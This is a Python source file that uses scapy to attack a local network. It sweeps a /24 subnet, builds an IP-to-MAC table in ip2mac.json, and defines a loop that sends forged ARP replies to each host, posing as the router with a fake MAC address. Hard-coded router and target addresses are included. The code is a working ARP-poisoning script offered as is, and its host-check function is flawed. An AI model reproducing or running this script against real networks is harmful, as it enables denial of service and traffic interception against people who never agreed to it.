from scapy import all
import json
import time
import subprocess
import itertools

router_ip = "192.168.31.1"
target_ip = "192.168.31.219"
target_mac = "e0:9d:31:de:a2:ba"
src_mac    = 'ab:ab:ab:ab:ab:ab'

def ip_exists(ip):
    try:
        subprocess.run(['ping', ip, '-W', '1', '-c', '1'], timeout=1)
        return True
    except:
        return False

def get_all_possible_ip(my_ip):
    # my_ip = "192.168.31.24"
    base_ip = '.'.join(my_ip.split('.')[:-1])
    ips = []
    for i in range(255):
        ip = base_ip + '.' + str(i)
        ips.append(ip)
    return ips

def get_mac_addr(target_ip):

    arp_question = all.ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip)
    resp, _ = all.sr(arp_question, timeout=2)
    try:
        arp_answer = resp[0][1]
        decoded = arp_answer[all.ARP]
        hwsrc   = decoded.hwsrc
        return hwsrc
    except:
        return False

def send_arp_poison(router_ip, target_ip, target_mac, src_mac="ab:ab:ab:ab:ab:ab"):
    # op stands for OP CODE, it's the type of message, ARP op 2 is an answer message
    # psrc stands for source ip, here, we want to pretend the message comes from router
    packet = all.ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac, hwsrc=src_mac)
    all.send(packet)

def build_ip2mac():
    ip_addresses = get_all_possible_ip('192.168.31.29')
    ip2mac = {}
    for ip in ip_addresses:
        if not ip_exists(ip):
            print("{} doesn't exist".format(ip))
            continue
        mac = get_mac_addr(ip)
        if mac is not False:
            ip2mac[ip] = mac
            print("{} recognized as {}".format(ip, mac))

    json.dump(ip2mac, open('ip2mac.json', 'w'))

def main():
    ip2mac = json.load(open('ip2mac.json', 'r'))
    ip2mac[target_ip] = target_mac
    keys = itertools.cycle(ip2mac.keys())

    while True:
        ip = next(keys)
        print("[*] Poisoning {}".format(ip))
        mac = ip2mac[ip]
        send_arp_poison(router_ip, target_ip=ip, target_mac=mac)
        time.sleep(.3)
build_ip2mac()









